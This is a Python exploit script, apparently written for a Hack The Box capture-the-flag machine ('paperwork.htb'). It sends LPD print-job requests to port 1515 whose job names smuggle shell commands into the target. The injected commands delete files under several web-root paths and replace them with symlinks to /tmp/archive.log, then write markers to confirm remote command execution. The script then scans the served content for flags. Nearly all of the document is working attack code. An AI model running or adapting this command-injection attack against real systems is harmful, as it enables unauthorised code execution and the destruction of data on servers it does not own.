#!/usr/bin/env python3
"""Symlink attack: replace archive with symlink to /tmp/archive.log"""
import socket, time, urllib.request

TARGET = '10.129.38.158'

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
    except:
        pass
    s.close()

def check_archive():
    req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read()
    except:
        return None

# Get reference
ref = check_archive()
print(f"[0] Reference: {len(ref)} bytes" if ref else "[0] No reference", flush=True)

# Try symlink attack on common paths
print("[1] Injecting symlink commands...", flush=True)

paths_to_try = [
    '/var/www/html/download/archive',
    '/usr/share/nginx/html/download/archive',
    '/var/www/paperwork.htb/download/archive',
    '/srv/http/download/archive',
    '/opt/download/archive',
    '/var/www/html/archive',
    '/usr/share/nginx/html/archive',
]

for p in paths_to_try:
    # First find and remove the original file, then create symlink
    lpd(f"';rm -f {p} 2>/dev/null; ln -sf /tmp/archive.log {p} 2>/dev/null; chmod 644 /tmp/archive.log 2>/dev/null;echo '")
    time.sleep(0.3)

# Now inject a unique marker into archive.log
import os
MARKER = 'SYMLINK_' + os.urandom(4).hex()
print(f"[2] Injecting marker: {MARKER}", flush=True)
lpd(f"';echo {MARKER} >> /tmp/archive.log;echo '")
time.sleep(2)

# Check if marker appears in /download/archive
print("[3] Checking /download/archive...", flush=True)
data = check_archive()
if data:
    print(f"  Got {len(data)} bytes", flush=True)
    decoded = data.decode(errors='replace')
    if MARKER in decoded:
        print(f"  *** SYMLINK WORKED! /download/archive now serves /tmp/archive.log", flush=True)
        print(f"  Content: {decoded[:2000]}", flush=True)
        # Search for flags
        import re
        flags = re.findall(r'HTB\{[^}]+\}', decoded)
        if flags:
            print(f"  *** FLAG: {flags[0]}", flush=True)
    else:
        print(f"  Marker not found. Content: {decoded[:200]}", flush=True)
        # Maybe it's binary? Check if it's still a ZIP
        if decoded.startswith('PK'):
            print(f"  Still a valid ZIP (symlink failed)", flush=True)
else:
    print("  No response - service might be down", flush=True)

# Also try: maybe 'archive' file is actually 'archive.zip' and nginx strips extension
print("[4] Also try archive.zip symlink...", flush=True)
for p in paths_to_try:
    lpd(f"';rm -f {p}.zip 2>/dev/null; ln -sf /tmp/archive.log {p}.zip 2>/dev/null;echo '")
    time.sleep(0.3)

MARKER2 = 'RCE_' + os.urandom(4).hex()
lpd(f"';echo {MARKER2} >> /tmp/archive.log;echo '")
time.sleep(2)

# Check both paths
for url_path in ['/download/archive', '/download/archive.zip', '/archive', '/archive.zip']:
    req = urllib.request.Request(f'http://{TARGET}{url_path}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        data = resp.read()
        if MARKER.encode() in data or MARKER2.encode() in data:
            print(f"  *** MARKER FOUND at {url_path}!", flush=True)
            print(f"  Content: {data.decode(errors='replace')[:2000]}", flush=True)
            import re
            flags = re.findall(r'HTB\{[^}]+\}', data.decode(errors='replace'))
            if flags:
                print(f"  *** FLAG: {flags[0]}", flush=True)
    except:
        pass

print("DONE", flush=True)
